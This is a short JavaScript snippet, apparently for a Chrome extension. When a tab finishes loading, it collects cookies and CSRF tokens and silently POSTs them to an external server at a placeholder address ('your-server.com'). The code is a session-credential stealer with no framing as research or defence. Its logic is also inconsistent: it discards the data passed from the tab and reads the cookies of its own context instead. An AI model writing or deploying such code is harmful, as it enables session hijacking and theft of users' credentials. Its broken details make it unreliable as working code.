function sendSessionParameters(details) {
  const xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://your-server.com/your-endpoint', true);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.onreadystatechange = () => {
    if (xhr.readyState === 4) {
      console.log(xhr.status, xhr.statusText);
    }
  };
  const params = {
    cookies: [],
    csrf_tokens: [],
  };
  for (const cookie of document.cookie.split('; ')) {
    const [name, value] = cookie.split('=');
    if (name.startsWith('csrftoken')) {
      params.csrf_tokens.push({name, value});
    }
    params.cookies.push({name, value});
  }
  xhr.send(JSON.stringify(params));
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.active) {
    chrome.tabs.sendMessage(tabId, {type: 'getSessionParameters'}, (response) => {
      if (response && response.params) {
        sendSessionParameters(response.params);
      }
    });
  }
});
